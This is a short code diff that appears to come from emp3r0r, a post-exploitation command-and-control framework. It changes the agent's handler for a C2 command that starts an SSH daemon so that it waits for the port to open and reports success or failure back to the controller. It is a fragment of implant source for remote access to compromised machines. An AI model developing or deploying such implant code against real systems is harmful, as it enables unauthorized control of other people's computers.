@@ -11,6 +11,7 @@ import (
 	"os/exec"
 	"strconv"
 	"strings"
+	"time"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
@@ -296,7 +297,16 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 					log.Printf("Failed to start SSHD: %v", err)
 				}
 			}()
-			return
+			out = "success"
+			for !tun.IsPortOpen("127.0.0.1", port) {
+				time.Sleep(100 * time.Millisecond)
+				if err != nil {
+					out = fmt.Sprintf("sshd failed to start: %v", err)
+					break
+				}
+			}
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
+			goto send
 		}
 
 		// proxy server
